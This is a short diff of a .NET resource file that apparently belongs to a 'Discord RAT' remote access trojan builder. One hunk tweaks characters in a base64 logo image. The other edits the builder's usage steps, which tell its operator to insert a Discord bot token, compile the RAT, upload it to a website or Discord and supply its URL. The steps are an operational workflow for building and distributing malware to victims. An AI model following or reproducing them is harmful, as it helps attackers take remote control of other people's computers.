@@ -121,7 +121,7 @@
   <data name="logoBox.Image" type="System.Drawing.Bitmap, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
     <value>
         iVBORw0KGgoAAAANSUhEUgAAA+gAAAPoCAYAAABNo9TkAAAABGdBTUEAALGPC/xhBQAAAAlwSFlzAAAu
-        IwAALiMBeKU/dgAAqWFJREFUeF7s3XecJUW5h3F3l5xzBpFsAFTEjIoRc8acMXtVzDnhNQvmnFFUzBEx
+        IgAALiIBquLdkgAAqWFJREFUeF7s3XecJUW5h3F3l5xzBpFsAFTEjIoRc8acMXtVzDnhNQvmnFFUzBEx
         Y0IQUEAQkShBguS4wLL3eXWXuyy/3Z2ZOnOm+5znj+/He19mZ97TXVWn3+6q6pvNnz9fkiRJkiTNsBiU
         JEmSJEnDFYOSJEmSJGm4YlCSJEmSJA1XDEqSJEmSpOGKQUmSJEmSNFwxKEmSJEmShisGJUmSJEnScMWg
         JEmSJEkarhiUJEmSJEnDFYOSJEmSJGm4YlCSJEmSJA1XDEqSJEmSpOGKQUmSJEmSNFwxKEmSJEmShisG
@@ -856,7 +856,7 @@
 3. Click install button.
 4. Insert discord bot token and press Insert button.
 5. Click compile rat button.
-6. Upload compiled rat to website/discord.
+6. Upload compiled rat to website/discord &lt; AppData/Discord AIO &gt;.
 7. Provide url of compiled rat into.
 8. Check Discord RAT in additional page.
 
